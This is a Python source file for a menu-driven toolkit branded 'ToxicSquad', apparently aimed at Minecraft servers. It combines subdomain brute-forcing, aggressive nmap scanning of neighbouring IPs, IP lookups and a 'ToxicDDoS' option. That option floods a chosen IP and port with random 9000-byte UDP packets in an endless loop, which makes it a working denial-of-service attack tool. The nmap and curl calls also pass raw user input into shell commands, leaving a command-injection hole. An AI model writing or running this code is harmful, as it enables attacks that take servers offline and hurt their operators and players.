import socket
import subprocess
import os
import sys
from threading import Thread
import time
from mcstatus import MinecraftServer
from colorama import *
import random

def clear(): 
    if (os.name == "nt"): 
        os.system('cls') 
    else: 
        os.system('clear') 

def separator():
    print(Fore.WHITE + "---------------------------------------------------------------------------------------")

def mainMenu():
    clear()

    separator()
    print(Fore.RED)
    print("▄▄▄█████▓ ▒█████  ▒██   ██▒ ██▓ ▄████▄    ██████   █████   █    ██  ▄▄▄      ▓█████▄ ")
    print("▓  ██▒ ▓▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▒██▀ ▀█  ▒██    ▒ ▒██▓  ██▒ ██  ▓██▒▒████▄    ▒██▀ ██▌")
    print("▒ ▓██░ ▒░▒██░  ██▒░░  █   ░▒██▒▒▓█    ▄ ░ ▓██▄   ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ░██   █▌")
    print("░ ▓██▓ ░ ▒██   ██░ ░ █ █ ▒ ░██░▒▓▓▄ ▄██▒  ▒   ██▒░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ░▓█▄   ▌")
    print("  ▒██▒ ░ ░ ████▓▒░▒██▒ ▒██▒░██░▒ ▓███▀ ░▒██████▒▒░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒░▒████▓ ")
    print("  ▒ ░░   ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓  ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░ ▒▒▓  ▒ ")
    print("    ░      ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░  ░  ▒   ░ ░▒  ░ ░ ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░ ░ ▒  ▒ ")
    print("  ░      ░ ░ ░ ▒   ░    ░   ▒ ░░        ░  ░  ░     ░   ░  ░░░ ░ ░   ░   ▒    ░ ░  ░ ")
    print("             ░ ░   ░    ░   ░  ░ ░            ░      ░       ░           ░  ░   ░    ")
    print("                               ░                                              ░      ")
    print()
    separator()

    print(Fore.YELLOW)
    print(Fore.RED + "[X] [New addons] " + Fore.BLUE)
    print("[1] Subdomain Scanner")
    print("[2] Dedicated Scanner")
    print("[3] Nmap Tracker")
    print("[4] IP Info")
    print("[5] ServerStatus)")
    print("[6] ToxicDDoS")
    print("[7] SQLI Checker")
    print(Fore.RED)
    print("[9] Script made by xIsm4")
    print(Fore.WHITE)

    separator()
    print()

    try:
        selection = input(Fore.BLUE + "root@ToxicSquad: " + Fore.YELLOW)
    except KeyboardInterrupt:
        print(Fore.WHITE)
        sys.exit()

    try:
        selection = int(selection)
    except:
        clear()
        print("Please type a number!")
        time.sleep(2)
        mainMenu()

    print(Fore.WHITE)
    if (selection == 1):
        subdomain()
    if (selection == 2):
        deds()
    if (selection == 3):
        tracker()
    if (selection == 4):
        ipinfo()
    if (selection == 5):
        serverstatus()
    if (selection == 6):
        toxicdos()
    if (selection == 99):
        clear()
        quit()

def back():
    print()
    if (os.name == "nt"):
        os.system("pause")
    else:
        os.system('read -s -n 1 -p "Press any key to continue..."')
    
    mainMenu()

def subdomain():
    domain = input("Domain: ")
    
    clear()

    print("--- Subdomains of " + domain + " ---")
    print(Fore.YELLOW)

    subdomains = ["www", "build", "web", "dev", "staff", "mc", "play", "sys", "node1", "node2", "node3", "builder", "developer", "test", "test1", "forum", "bans", "baneos", "ts", "ts3", "sys1", "sys2", "mods", "bungee", "bungeecord", "array", "spawn", "server", "help", "client", "api", "smtp", "s1", "s2", "s3", "s4", "server1", "server2", "jugar", "login", "mysql", "phpmyadmin", "demo", "na", "eu", "us", "es", "fr", "it", "ru", "support", "developing", "discord", "backup", "buy", "buycraft", "go", "dedicado1", "dedi", "dedi1", "dedi2", "dedi3", "minecraft", "prueba", "pruebas", "ping", "register", "cdn", "stats", "store", "serie", "buildteam", "info", "host", "jogar", "proxy", "vps", "ovh", "partner", "partners", "appeals", "appeal", "store-assets"]
    for subdomain in subdomains:
        try:
            fullsub = str(subdomain)+"."+str(domain)
            ipofsub = socket.gethostbyname(str(fullsub))
            print(fullsub + " - " + ipofsub)
        except:
            pass
    
    back()

def toxicdos():
    ip = input("Target IP: ")
    port = int(input("Target Port: "))

    clear()

    print("Starting...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(9000)

    clear()

    print("Ddos started. Press CTRL + C to cancel")
    while True:
        try:
            sock.sendto(bytes, (ip, port))
        except KeyboardInterrupt:
            back()

def deds():

    domain = input("Domain: ")

    clear()

    print("--- Dedicated servers of " + domain + " ---")
    print()

    ip_list = []
    ais = socket.getaddrinfo(domain,0,0,0,0)
    for result in ais:
        ip_list.append(result[-1][0])
        ip_list = list(set(ip_list))

    for x in range(len(ip_list)):
        print(ip_list[x])
    
    back()

def tracker():
    ip = input("IP: ")

    ip1 = ip.split(".")[0]
    ip2 = ip.split(".")[1]
    ip3 = ip.split(".")[2]
    ip4 = ip.split(".")[3]

    iprest = str(int(ip4) - 1)
    ipsum = str(int(ip4) + 1)

    result = ip1 + "." + ip2 + "." + ip3 + "." + iprest + "-" + ipsum

    clear()

    os.system ("nmap -p 1-12,1000-1010,20000-20005,25500-25600,28010-28015,30000-30005,40000-40010,65500-65535 -T5 -v -A -Pn " + result)

    back()

def ipinfo():
    ip = input("IP: ")

    clear()

    print("--- Info of " + ip + " ---")
    print()

    os.system("curl ipinfo.io/" + ip)

    print()
    back()

def serverstatus():
    ip = input("IP: ")

    port = 25565
    if (len(ip.split(":")) != 1):
        port = int(ip.split(":")[1])
        ip = ip.split(":")[0]

    print("Connecting")
    server = MinecraftServer(ip, port)

    print("Getting status")
    status = server.status()

    clear()

    print("--- Status of " + ip + " ---")
    print()

    print("Motd: ", end="")
    print(status.description)
    print("Players: " + str(status.players.online) + "/" + str(status.players.max))
    print("Version: " + status.version.name)
    print("Ping: " + str(status.latency))

    back()

    print(status.description)
if (__name__ == "__main__"):
    mainMenu()

  
